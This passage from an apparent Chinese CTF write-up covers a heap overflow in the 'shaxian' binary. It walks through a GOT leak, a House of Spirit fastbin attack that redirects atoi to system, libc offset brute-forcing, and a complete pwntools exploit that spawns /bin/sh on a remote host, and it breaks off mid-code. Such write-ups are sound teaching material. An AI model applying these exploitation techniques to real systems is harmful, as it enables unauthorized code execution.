<span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Nothing in cart"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Address:%s\n"</span>, &amp;Address_buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Phone:%s\n"</span>, &amp;Phone_number_buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"Title:%s\n"</span>, &amp;Title);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;由于程序是<code>堆溢出</code>，而且大小是<code>40+8</code>(presize+size)，因此可以利用<code>fastbin</code>结构进行堆块的利用。<code>泄露信息部分</code>较为简单，因为结构体中自带了<code>next指针</code>，这个地方是可以覆盖的，所以直接覆盖后，在<code>打印信息</code>的时候就可以泄露相关的<code>got表信息</code>。打印信息部分如下所示：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( shopping_cart )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Cart:"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( tmp_head_ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s * %d\n"</span>, tmp_head_ptr-&gt;food_type, tmp_head_ptr-&gt;count);</span><br><span class="line">    tmp_head_ptr = (shopping_cart_struct *)tmp_head_ptr-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Total:%d\n"</span>, shopping_cart);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Nothing in cart"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;<code>地址写</code>的逻辑主要是通过<code>fastbin</code>来修改<code>head指针</code>，在<code>head_ptr_0804B1C0</code>处伪造一个假的堆块<code>fake_chunk</code>，修改<code>next指针</code>指向该fake_chunk，然后通过<code>free</code>成功释放掉该fake_chunk。<code>再次申请</code>时，该fake_chunk将被分配，并且刚好能实现4字节<code>任意地址</code>写<code>任意数据</code>(将atoi_got改写为system)，所以下次输入编号的时候，直接输入“/bin/sh”即可。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">head_ptr_0804B1C0 = (shopping_cart_struct *)<span class="built_in">malloc</span>(<span class="number">40u</span>);</span><br><span class="line"><span class="keyword">if</span> ( !head_ptr_0804B1C0 )                     <span class="comment">// buffer分配出错</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Error"</span>);</span><br><span class="line">head_ptr_0804B1C0-&gt;next = (<span class="keyword">int</span>)tmp_head_ptr;</span><br><span class="line">input_message(<span class="number">0</span>, (<span class="keyword">int</span>)head_ptr_0804B1C0-&gt;food_type, <span class="number">60</span>, <span class="number">10</span>);<span class="comment">// 漏洞点,堆溢出</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"How many?"</span>);</span><br><span class="line">tmp_ptr = head_ptr_0804B1C0;</span><br><span class="line">tmp_ptr-&gt;count = get_num();</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;然而本题的考点主要在于，<code>libc</code>是主办方<code>自己编译</code>的，网上无法查到，所以其偏移带有特殊性。这里必须通过某种方法对其进行泄露，由于这里是堆中，修改的信息十分有限，不像栈那样简单。因此此题可以使用<code>两种方法</code>来求解。</p>
<h3 id="0x20-方法一：对libc库中的函数偏移进行爆破。"><a href="#0x20-方法一：对libc库中的函数偏移进行爆破。" class="headerlink" title="0x20 方法一：对libc库中的函数偏移进行爆破。"></a>0x20 方法一：对libc库中的函数偏移进行爆破。</h3><p><strong><code>利用思路</code></strong>：</p>
<p>1、根据经验，<code>system地址</code>与<code>atoi地址</code>相距并不远(atoi在libc中的偏移是小于system的)，而且这些<code>库函数的地址</code>大都比较规整，为<code>0x10</code>的整数倍，于是可以通过<code>暴力破解</code>得到system的地址。为了<code>防止卡死</code>，我们通过发送<code>&quot;cat /home/ctf/flag&quot;</code>命令，作为system的参数，让远程服务器执行，通过<code>返回的结果</code>来判断是否正确执行，从而判断是否得到system函数与atoi函数的偏移。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">io.writeline(<span class="string">'/bin/cat /home/*/Desktop/flag'</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">data = io.recv(<span class="number">200</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">"RCTF"</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">"No such file"</span> <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"----------------dis is correct!!!----------------"</span></span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io.close()</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;虽然偏移不会很大，但是为了节省时间，我们可以<code>分段</code>进行<code>暴力破解</code>。如：分别从0x0，0x5000，0xA000，0xD000的距离开始破解。</p>
<p>2、点菜时，我们通过输入<code>food_type</code>将其后面的的<code>next指针</code>覆盖为<code>atoi_got-0x4</code>，因为<code>next指针</code>指向的是结构体中的<code>count成员</code>，而它的大小为<code>0x4字节</code>。所以，通过<code>Review</code>查看的时候，会通过[next]-&gt;food_type将<code>atoi_got</code>的内容输出出来。我们就得到了<code>atoi的地址</code>。加上<code>dis</code>(system与atoi的偏移)，就可以得到<code>system的地址</code>。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'A'</span>*<span class="number">32</span> + p32(atoi_got - <span class="number">4</span>)</span><br><span class="line">dian_cai(io,payload,<span class="number">2</span>) 		<span class="comment"># 修改next指针为(atoi_got - 4)</span></span><br><span class="line">atoi_addr = leak_atoi_addr(io)</span><br></pre></td></tr></table></figure></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( tmp_head_ptr )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s * %d\n"</span>, tmp_head_ptr-&gt;food_type, tmp_head_ptr-&gt;count);</span><br><span class="line">  tmp_head_ptr = (shopping_cart_struct *)tmp_head_ptr-&gt;next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>3、因为每次点菜时，分配的堆块大小为<code>0x30字节</code>，处于<code>fastbin范围</code>之内(16byte - 64byte)，所以，我们可以使用Fastbin相关漏洞利用技术进行攻击。再次点菜时，我们使用<code>Fastbin Attack</code>中的<code>House of Spirit</code>类型漏洞利用技术，并将<code>next指针</code>覆盖为<code>head_ptr_0804B1C0 - 0x8</code>。在此之前，我们已经将<code>head_ptr_0804B1C0</code>周围的内存区域构造成了一个<code>fake_chunk</code>，输入<code>Phone_number</code>和<code>Address</code>时，我们分别构造了<code>fake_chunk</code>的chunk_header和fake_chunk相邻的<code>下一chunk</code>的chunk_header。构造的目的是绕过<code>Free函数</code>中的一些检测，使fake_chunk成功放入<code>fastbin链表</code>中。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">内存布局：</span></span><br><span class="line"><span class="string">0x0804B0C0 - 0x0804B1C0  Phone_number </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[fake_chunk] for head_ptr</span></span><br><span class="line"><span class="string">0x0804B1B0 - 0x0804B1B8  chunk_header</span></span><br><span class="line"><span class="string">0x0804B1B8 - 0x0804B1BC  count</span></span><br><span class="line"><span class="string">0x0804B1BC - 0x0804B1C0------------</span></span><br><span class="line"><span class="string">0x0804B1C0 - 0x0804B1C4  head_ptr |food_type</span></span><br><span class="line"><span class="string">0x0804B1C4 - 0x0804B1DC------------	</span></span><br><span class="line"><span class="string">0x0804B1DC - 0x0804B1E0  next</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x0804B1E0 - 0x0804B1E8  Address(next_chunk's chunk_header)</span></span><br><span class="line"><span class="string">0x0804B1E8 - 0x0804B2E0  Address</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'Your Address:\n'</span>)</span><br><span class="line">io.sendline(p32(<span class="number">0x0</span>) + p32(<span class="number">0x31</span>))</span><br><span class="line">io.recvuntil(<span class="string">'Your Phone number:\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'A'</span>*<span class="number">244</span> + p32(<span class="number">0x31</span>))</span><br><span class="line">......</span><br><span class="line">payload1 = <span class="string">'A'</span>*<span class="number">32</span> + p32(head_ptr - <span class="number">8</span>)</span><br><span class="line">dian_cai(io,payload1,<span class="number">3</span>)		<span class="comment"># 修改next指针为(head_ptr - 8)</span></span><br></pre></td></tr></table></figure></p>
<p>4、接下来，我们再通过Submit()函数中的<code>Free()函数</code>，将此fake_chunk释放入<code>fastbin链表</code>中。由于fake_chunk是<code>最后一个</code>释放的chunk，所以排在<code>fastbin链表</code>的<code>头部</code>。下次调用<code>malloc()函数</code>分配堆块时，就会<code>分配</code>到这个fake_chunk，从而可以<code>更改</code>fake_chunk的内容。若我们将<code>head_ptr的内容</code>修改为<code>atoi_got</code>，输入count时，将system的地址填入，就将<code>system地址</code>写到了<code>atoi_got</code>。下次调用atoi()函数时，输入“/bin/sh”，就相当于调用了<code>system(&quot;/bin/sh&quot;)</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 执行完Submit()</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x10: 0x0</span><br><span class="line">0x18: 0x0</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x28: 0x0</span><br><span class="line">0x30: 0x804b1b0 —▸ 0x804c060 ◂— 0x0</span><br><span class="line">0x38: 0x0</span><br><span class="line">0x40: 0x0</span><br></pre></td></tr></table></figure></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将system地址写入atoi的got表中</span></span><br><span class="line">system_addr = sign_Hex2Dec(system_addr)</span><br><span class="line"><span class="comment"># system_addr = struct.unpack("i",p32(system_addr))[0]</span></span><br><span class="line">payload2 = <span class="string">'A'</span>*<span class="number">4</span> + p32(atoi_got)</span><br><span class="line">dian_cai(io,payload2,system_addr) <span class="comment"># 0x804b1b8</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;由于我们输入的<code>count</code>是以<code>字符串形式</code>输入的，之后会经过<code>atoi()函数</code>，将我们的输入转化为<code>整数</code>，存储于count中。我们得到的<code>system()函数地址</code>是<code>16进制形式</code>的字符串，所以我们需要将system()函数的地址值转化为<code>有符号10进制字符串</code>输入(count为int型)，才能使count中保存的是我们所需要的system()函数的地址。</p>
<p><strong><code>完整exp</code></strong>:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Author:Sp4n9x</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># libc版本: libc6_2.23-0ubuntu11.2_i386</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct,time</span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.binary = <span class="string">'./shaxian'</span></span><br><span class="line">context = &#123;<span class="string">'arch'</span>:<span class="string">'i386'</span>,<span class="string">'bits'</span>:<span class="string">'32'</span>,<span class="string">'endian'</span>:<span class="string">'little'</span>,<span class="string">'os'</span>:<span class="string">'linux'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">bp 0x08048B31,main函数起始地址</span></span><br><span class="line"><span class="string">bp 0x08048912,malloc后，查看分配的堆块的数据域地址</span></span><br><span class="line"><span class="string">bp 0x08048B8E,Diancai函数返回地址</span></span><br><span class="line"><span class="string">bp 0x080489F6,查看要Free的堆块地址</span></span><br><span class="line"><span class="string">bp 0x08048B95,Submit函数返回地址</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">gdbscript = <span class="string">'''</span></span><br><span class="line"><span class="string">            bp 0x08048B31</span></span><br><span class="line"><span class="string">            bp 0x08048912</span></span><br><span class="line"><span class="string">            bp 0x08048B8E</span></span><br><span class="line"><span class="string">            bp 0x080489F6</span></span><br><span class="line"><span class="string">            bp 0x08048B95'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_io</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        io = remote(<span class="string">'220.249.52.133'</span>,<span class="number">34604</span>) </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            io = gdb.debug(<span class="string">'./shaxian'</span>,gdbscript = gdbscript)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            io = process(<span class="string">'./shaxian'</span>)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">input_info</span><span class="params">(io)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'Your Address:\n'</span>)</span><br><span class="line">    io.sendline(p32(<span class="number">0x0</span>) + p32(<span class="number">0x31</span>))</span><br><span class="line">    io.recvuntil(<span class="string">'Your Phone number:\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'A'</span>*<span class="number">240</span> + p32(<span class="number">0x0</span>) + p32(<span class="number">0x31</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dian_cai</span><span class="params">(io,name,count)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'choose:\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'5.Jianjiao\n'</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line">    io.recvuntil(<span class="string">'How many?\n'</span>)</span><br><span class="line">    io.sendline(str(count))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span><span class="params">(io)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'choose:\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">receipt</span><span class="params">(io,taitou)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'choose:\n'</span>)  <span class="comment"># 程序中用的是puts()</span></span><br><span class="line">    io.sendline(<span class="string">'3'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Taitou:'</span>)    <span class="comment"># 程序中用的是printf()</span></span><br><span class="line">    io.sendline(taitou)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">review</span><span class="params">(io)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'choose:\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'4'</span>)	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_atoi_addr</span><span class="params">(io)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'choose:\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'4'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'* 2\n'</span>)</span><br><span class="line">    atoi_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">    <span class="keyword">return</span> atoi_addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign_Hex2Dec</span><span class="params">(data)</span>:</span></span><br><span class="line">    width = <span class="number">32</span>  <span class="comment"># 16进制数所占位数</span></span><br><span class="line">    dec_data = int(hex(data)[<span class="number">2</span>:], <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> dec_data &gt; (<span class="number">2</span>  (width - <span class="number">1</span>) - <span class="number">1</span>):</span><br><span class="line">        tmp_data = <span class="number">2</span>  width - dec_data</span><br><span class="line">        sign_dec = <span class="number">0</span> - tmp_data</span><br><span class="line">    <span class="keyword">return</span> sign_dec</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_system_dis</span><span class="params">()</span>:</span></span><br><span class="line">    dis = <span class="number">0xDB00</span></span><br><span class="line">    <span class="comment"># dis = 0xD000</span></span><br><span class="line">    <span class="keyword">while</span> dis &lt; <span class="number">0xFFFFFF</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"*Start*"</span></span><br><span class="line">            io = get_io()</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"dis:"</span>,hex(dis)</span><br><span class="line">            pwn(io,dis)</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"End"</span></span><br><span class="line">        <span class="keyword">except</span> Exception,e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            dis += <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">read_got = <span class="number">0x0804B010</span></span><br><span class="line">atoi_got = <span class="number">0x0804B038</span></span><br><span class="line">head_ptr = <span class="number">0x0804B1C0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc6_2.23-0ubuntu11.2_i386</span></span><br><span class="line"><span class="comment"># offset_atoi = 0x2D260</span></span><br><span class="line"><span class="comment"># offset_system = 0x3ADB0</span></span><br><span class="line"><span class="comment"># offset_puts = 0x5FCB0</span></span><br><span class="line"><span class="comment"># offset_read = 0xD5C00</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(io,dis)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    内存布局：</span></span><br><span class="line"><span class="string">    0x0804B0C0 - 0x0804B1C0  Phone_number </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    [fake_chunk] for head_ptr</span></span><br><span class="line"><span class="string">    0x0804B1B0 - 0x0804B1B8  chunk_header</span></span><br><span class="line"><span class="string">    0x0804B1B8 - 0x0804B1BC  count</span></span><br><span class="line"><span class="string">    0x0804B1BC - 0x0804B1C0------------</span></span><br><span class="line"><span class="string">    0x0804B1C0 - 0x0804B1C4  head_ptr |food_type</span></span><br><span class="line"><span class="string">    0x0804B1C4 - 0x0804B1DC------------	</span></span><br><span class="line"><span class="string">    0x0804B1DC - 0x0804B1E0  next</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    0x0804B1E0 - 0x0804B1E8  Address(next_chunk's chunk_header)</span></span><br><span class="line"><span class="string">    0x0804B1E8 - 0x0804B2E0  Address</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    input_info(io)</span><br><span class="line">    dian_cai(io,<span class="string">'Banmian'</span>,<span class="number">1</span>)    <span class="comment"># 先点一次菜，使atoi()函数得到调用，atoi()的GOT表得到填充</span></span><br><span class="line">    payload = <span class="string">'A'</span>*<span class="number">32</span> + p32(atoi_got - <span class="number">4</span>)</span><br><span class="line">    dian_cai(io,payload,<span class="number">2</span>)      <span class="comment"># 修改next指针为(atoi_got - 4)</span></span><br><span class="line">    atoi_addr = leak_atoi_addr(io)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"atoi_addr:"</span>,hex(atoi_addr)	</span><br><span class="line">    payload1 = <span class="string">'A'</span>*<span class="number">32</span> + p32(head_ptr - <span class="number">8</span>)</span><br><span class="line">    dian_cai(io,payload1,<span class="number">3</span>)     <span class="comment"># 修改next指针为(head_ptr - 8)</span></span><br><span class="line"></span><br><span class="line">    submit(io)	<span class="comment"># 释放shopping_cart结构体内存</span></span><br><span class="line">    raw_input(<span class="string">'After submit'</span>)</span><br><span class="line">    </span><br><span class="line">    system_addr = atoi_addr + dis</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"system_addr:"</span>,hex(system_addr)</span><br><span class="line">    system_addr = sign_Hex2Dec(system_addr)</span><br><span class="line">    <span class="comment"># system_addr = struct.unpack("i",p32(system_addr))[0]</span></span><br><span class="line">    <span class="keyword">print</span> system_addr</span><br><span class="line">    payload2 = <span class="string">'A'</span>*<span class="number">4</span> + p32(atoi_got)</span><br><span class="line">    <span class="comment"># 重新分配的堆块为之前释放的堆块(head_ptr - 8)，之后head_ptr指向该堆块，next = atoi_got</span></span><br><span class="line">    dian_cai(io,payload2,system_addr)	</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        io.writeline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">        io.interactive()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.writeline(<span class="string">'/bin/cat /home/buffer/Desktop/flag'</span>)</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line">        data = io.recv(<span class="number">200</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"RCTF"</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">"No such file"</span> <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"----------------dis is correct!!!----------------"</span></span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            io.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    flag = <span class="number">1</span>	<span class="comment"># flag = 1表示已找到dis</span></span><br><span class="line">    debug = <span class="number">0</span>	<span class="comment"># debug = 1表示进行调试</span></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        dis = <span class="number">0xDB50</span>	<span class="comment"># system()函数地址与atoi()函数地址的差值</span></span><br><span class="line">        <span class="comment"># dis = 0xD600	# system()中调用的函数的地址与atoi()函数地址的差值</span></span><br><span class="line">        io = get_io()</span><br><span class="line">        pwn(io,dis)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        get_system_dis()</span><br></pre></td></tr></table></figure></p>
<h3 id="0x30-方法二：使用ret2-dl-runtime-resolve方式进行利用。"><a href="#0x30-方法二：使用ret2-dl-runtime-resolve方式进行利用。" class="headerlink" title="0x30 方法二：使用ret2_dl_runtime_resolve方式进行利用。"></a>0x30 方法二：使用ret2_dl_runtime_resolve方式进行利用。</h3><p>&emsp;&emsp;<code>FlappyPig</code>所给的exp我没有利用成功，我分析了一下其脚本中所使用的<code>内存布局</code>。其将<code>fake_chain</code>(也就是假的重定位项、符号项、符号字符串以及system函数参数)布置在了<code>Address缓冲区的末尾</code>，但是sym_data所对应的<code>sym_index</code>所找到的符号版本索引(ndx)为<code>0x55C3</code>，使<code>l-&gt;l_version[ndx]</code>访问到了<code>不可访问</code>的地址。但是我计算了一下，将<code>fake_chain</code>布置在<code>Address</code>，还是<code>Phone_number</code>和<code>Title</code>，只能得到少数几个符号版本表vernum(.gnu.version)中合理的ndx值，不过，这就够了。<code>ndx</code>也可以越界访问<code>l_version数组</code>，但是需要让访问到的地址的<code>version-&gt;Hash</code>位置的值为0。<code>ndx值</code>一般为下面可执行文件或libc的符号版本信息中<code>“.gnu.version_d”</code>中的index的值(Elf32_Verdef)或<code>“.gnu.version_r”</code>中的version值(Elf32_Vernaux中的vna_other成员)(实际上好像有点偏差，但不大)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 